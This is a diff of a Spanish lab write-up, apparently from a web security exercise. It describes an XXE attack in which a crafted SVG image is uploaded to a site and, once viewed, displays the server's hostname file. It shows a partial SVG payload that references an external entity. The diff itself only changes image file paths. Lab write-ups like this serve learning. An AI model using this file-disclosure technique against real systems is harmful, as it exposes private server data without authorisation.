@@ -4,7 +4,7 @@ Creamos un archivo SVG en el que definimos una entidad que apunta al archivo del
 
 Solucion
 primero podemos usar la biblia
-![Pasted image 20250730205158.png](imagenes/Pasted image 20250730205158.png)
+![Pasted_image_20250730205158.png](Imagenes/Pasted_image_20250730205158.png)
 https://github.com/swisskyrepo/PayloadsAllTheThings
 
 entonces aqui lo que se hace es por medio de un archivo que dentro contendra un payload nos mostrar la data 
@@ -14,11 +14,11 @@ payload (<?xml version="1.0" standalone="yes"?>
    <text font-size="16" x="0" y="16">&xxe;</text>
 </svg>)
 Nuestra supuesta imagen se llamara image.svg y contendra el payload
-![Pasted image 20250730210003.png](imagenes/Pasted image 20250730210003.png)
+![Pasted_image_20250730210003.png](Imagenes/Pasted_image_20250730210003.png)
 y lo cargaremos en la web
-![Pasted image 20250730210143.png](imagenes/Pasted image 20250730210143.png)
+![Pasted_image_20250730210143.png](Imagenes/Pasted_image_20250730210143.png)
 aqui podemos ver nuestro comentario
-![Pasted image 20250730210223.png](imagenes/Pasted image 20250730210223.png)
+![Pasted_image_20250730210223.png](Imagenes/Pasted_image_20250730210223.png)
 aqui poco se ve la imagen pero lo abrimos en una nueva pestaña
-![Pasted image 20250730210259.png](imagenes/Pasted image 20250730210259.png)
+![Pasted_image_20250730210259.png](Imagenes/Pasted_image_20250730210259.png)
 y obtenemos dentro de la imagen el hostname
